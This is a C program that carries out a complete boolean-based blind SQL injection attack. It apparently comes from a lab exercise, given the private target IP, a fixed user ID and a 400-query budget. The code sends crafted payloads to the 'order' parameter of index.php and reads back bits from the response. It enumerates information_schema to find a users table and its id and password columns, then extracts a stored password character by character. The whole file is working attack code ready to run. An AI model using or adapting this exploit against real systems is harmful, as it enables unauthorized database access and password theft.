#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MY_ID "123456789"
#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 80
#define MAX_QUERIES 400
#define BUFFER_SIZE 8192
#define SUCCESS_STRING "Your order has been sent!"

static int query_counter = 0;

int create_and_connect_socket(void);
void build_http_request(const char *encoded_payload, char *request, size_t request_size);
bool send_http_request(int sockfd, const char *request);
bool receive_and_check_response(int sockfd);

/**
 * URL-encodes a string for safe transmission in HTTP requests.
 * 
 * Encodes special characters as %XX hex codes, spaces as %20.
 * Unreserved characters (A-Z, a-z, 0-9, -, _, ., ~) are left unchanged.
 * 
 * @param src Source string to encode
 * @param dest Destination buffer for encoded string
 * @param dest_size Size of destination buffer
 */
void url_encode(const char *src, char *dest, size_t dest_size) {
    const char *hex = "0123456789ABCDEF";
    size_t pos = 0;
    
    while (*src && pos < dest_size - 4) {
        if ((*src >= 'A' && *src <= 'Z') ||
            (*src >= 'a' && *src <= 'z') ||
            (*src >= '0' && *src <= '9') ||
            *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            dest[pos++] = *src;
        } else if (*src == ' ') {
            dest[pos++] = '%';
            dest[pos++] = '2';
            dest[pos++] = '0';
        } else {
            dest[pos++] = '%';
            dest[pos++] = hex[((unsigned char)*src) >> 4];
            dest[pos++] = hex[((unsigned char)*src) & 0x0F];
        }
        src++;
    }
    dest[pos] = '\0';
}

/**
 * Checks if a specific bit is set using a custom SQL query.
 * 
 * Generic bit-checking function that can work with any SQL subquery.
 * 
 * @param sql_subquery The SQL subquery that returns a character to test
 * @param char_pos Position of the character in the result (1-indexed)
 * @param bit_pos Position of the bit to check (0-7, where 7 is MSB)
 * @return true if the bit is set (1), false if unset (0) or on error
 */
bool check_bit_generic(const char *sql_subquery, int char_pos, int bit_pos) {
    if (query_counter >= MAX_QUERIES) {
        fprintf(stderr, "Error: Query limit exceeded\n");
        return false;
    }
    query_counter++;
    
    char payload[2048];
    snprintf(payload, sizeof(payload),
        "1 AND (SELECT (ASCII(SUBSTR((%s), %d, 1)) >> %d) & 1)",
        sql_subquery, char_pos, bit_pos);
    
    char encoded_payload[4096];
    url_encode(payload, encoded_payload, sizeof(encoded_payload));
    
    char request[8192];
    build_http_request(encoded_payload, request, sizeof(request));
    
    int sockfd = create_and_connect_socket();
    if (sockfd < 0) {
        return false;
    }
    
    if (!send_http_request(sockfd, request)) {
        close(sockfd);
        return false;
    }
    
    bool result = receive_and_check_response(sockfd);
    close(sockfd);
    
    return result;
}

/**
 * Extracts a string using bit-by-bit extraction with a SQL subquery.
 * 
 * @param sql_subquery The SQL subquery that returns the string to extract
 * @param output Output buffer for the extracted string
 * @param max_length Maximum length to extract
 * @return true on success, false on error
 */
bool extract_string(const char *sql_subquery, char *output, int max_length) {
    for (int char_idx = 1; char_idx <= max_length; char_idx++) {
        unsigned char current_char = 0;
        
        for (int bit = 7; bit >= 0; bit--) {
            bool bit_value = check_bit_generic(sql_subquery, char_idx, bit);
            if (bit_value) {
                current_char |= (unsigned char)(1 << bit);
            }
        }
        
        if (current_char == 0) {
            output[char_idx - 1] = '\0';
            return true;
        }
        
        output[char_idx - 1] = (char)current_char;
        printf("Position %d: '%c' (ASCII: %d, Queries: %d)\n", 
               char_idx, current_char, (int)current_char, query_counter);
    }
    
    output[max_length] = '\0';
    return true;
}

/**
 * Discovers the table name from information_schema.tables.
 * 
 * Searches for a table where table_name LIKE '%usr%' in database 67607db.
 * 
 * @param table_name Output buffer for the discovered table name
 * @return true on success, false on error
 */
bool discover_table_name(char *table_name) {
    printf("\n=== Discovering Table Name ===\n");
    const char *query = "SELECT table_name FROM information_schema.tables "
                        "WHERE table_schema = '67607db' AND table_name LIKE '%usr%'";
    
    if (!extract_string(query, table_name, 10)) {
        fprintf(stderr, "Error: Failed to extract table name\n");
        return false;
    }
    
    printf("Discovered table name: %s\n", table_name);
    return true;
}

/**
 * Discovers a column name from information_schema.columns.
 * 
 * Searches for a column that contains the specified pattern.
 * 
 * @param table_name The table name to search in
 * @param pattern Pattern to search for in column name (e.g., "id" or "pwd")
 * @param column_name Output buffer for the discovered column name
 * @return true on success, false on error
 */
bool discover_column_name(const char *table_name, const char *pattern, char *column_name) {
    printf("\n=== Discovering Column Name (pattern: '%s') ===\n", pattern);
    
    char query[512];
    snprintf(query, sizeof(query),
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_schema = '67607db' AND table_name = '%s' AND column_name LIKE '%%%s%%'",
        table_name, pattern);
    
    if (!extract_string(query, column_name, 10)) {
        fprintf(stderr, "Error: Failed to extract column name\n");
        return false;
    }
    
    printf("Discovered column name: %s\n", column_name);
    return true;
}

/**
 * Creates and connects a TCP socket to the target server.
 * 
 * @return Socket file descriptor on success, -1 on failure
 */
int create_and_connect_socket(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "Error: Failed to create socket\n");
        return -1;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Error: Invalid address\n");
        close(sockfd);
        return -1;
    }
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Error: Connection failed\n");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

/**
 * Builds an HTTP GET request with the encoded SQL injection payload.
 * 
 * @param encoded_payload URL-encoded SQL payload
 * @param request Output buffer for the HTTP request
 * @param request_size Size of the request buffer
 */
void build_http_request(const char *encoded_payload, char *request, size_t request_size) {
    snprintf(request, request_size,
        "GET /index.php?order=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        encoded_payload, TARGET_IP);
}

/**
 * Sends an HTTP request over a socket.
 * 
 * @param sockfd Socket file descriptor
 * @param request HTTP request string to send
 * @return true on success, false on failure
 */
bool send_http_request(int sockfd, const char *request) {
    size_t request_len = strlen(request);
    ssize_t bytes_sent = send(sockfd, request, request_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
        fprintf(stderr, "Error: Failed to send request\n");
        return false;
    }
    return true;
}

/**
 * Receives the HTTP response and checks if it contains the success string.
 * 
 * @param sockfd Socket file descriptor
 * @return true if response contains success string, false otherwise
 */
bool receive_and_check_response(int sockfd) {
    char buffer[BUFFER_SIZE];
    ssize_t total_received = 0;
    ssize_t bytes_received;
    
    while ((bytes_received = recv(sockfd, buffer + total_received, 
                                   (size_t)(BUFFER_SIZE - total_received - 1), 0)) > 0) {
        total_received += bytes_received;
        if (total_received >= BUFFER_SIZE - 1) {
            break;
        }
    }
    
    if (total_received <= 0) {
        fprintf(stderr, "Error: Failed to receive response\n");
        return false;
    }
    
    buffer[total_received] = '\0';
    return (strstr(buffer, SUCCESS_STRING) != NULL);
}

/**
 * Extracts the password from the discovered table using the discovered columns.
 * 
 * @param table_name Name of the table containing the password
 * @param id_col Name of the ID column
 * @param pwd_col Name of the password column
 * @param password Output buffer for the extracted password
 * @return true on success, false on error
 */
bool extract_password(const char *table_name, const char *id_col, 
                      const char *pwd_col, char *password) {
    printf("\n=== Extracting Password ===\n");
    
    char query[512];
    snprintf(query, sizeof(query),
        "SELECT %s FROM %s WHERE %s = '%s'",
        pwd_col, table_name, id_col, MY_ID);
    
    for (int char_idx = 1; char_idx <= 32; char_idx++) {
        unsigned char current_char = 0;
        
        for (int bit = 7; bit >= 0; bit--) {
            bool bit_value = check_bit_generic(query, char_idx, bit);
            if (bit_value) {
                current_char |= (unsigned char)(1 << bit);
            }
        }
        
        if (current_char == 0) {
            password[char_idx - 1] = '\0';
            printf("\nPassword extraction complete!\n");
            return true;
        }
        
        password[char_idx - 1] = (char)current_char;
        printf("Char %d: '%c' (ASCII: %d, Queries: %d)\n", 
               char_idx, current_char, (int)current_char, query_counter);
    }
    
    password[32] = '\0';
    return true;
}

/**
 * Main function that performs the complete blind SQL injection attack.
 * 
 * Phase 1: Discovers the table name from information_schema.tables
 * Phase 2: Discovers the ID and password column names from information_schema.columns
 * Phase 3: Extracts the password using the discovered schema information
 * 
 * @return 0 on success, 1 on error
 */
int main(void) {
    printf("Starting Boolean-based Blind SQL Injection...\n");
    printf("Query limit: %d\n", MAX_QUERIES);
    printf("Target: Database 67607db\n\n");
    
    char table_name[16] = {0};
    char id_col[16] = {0};
    char pwd_col[16] = {0};
    char password[64] = {0};
    
    if (!discover_table_name(table_name)) {
        return 1;
    }
    
    if (!discover_column_name(table_name, "id", id_col)) {
        return 1;
    }
    
    if (!discover_column_name(table_name, "pwd", pwd_col)) {
        return 1;
    }
    
    printf("\n=== Schema Discovery Complete ===\n");
    printf("Table: %s\n", table_name);
    printf("ID Column: %s\n", id_col);
    printf("Password Column: %s\n", pwd_col);
    printf("Queries used so far: %d / %d\n", query_counter, MAX_QUERIES);
    
    if (!extract_password(table_name, id_col, pwd_col, password)) {
        return 1;
    }
    
    printf("\n=== Final Result ===\n");
    printf("Extracted password: %s\n", password);
    printf("Total queries used: %d / %d\n", query_counter, MAX_QUERIES);
    
    return 0;
}
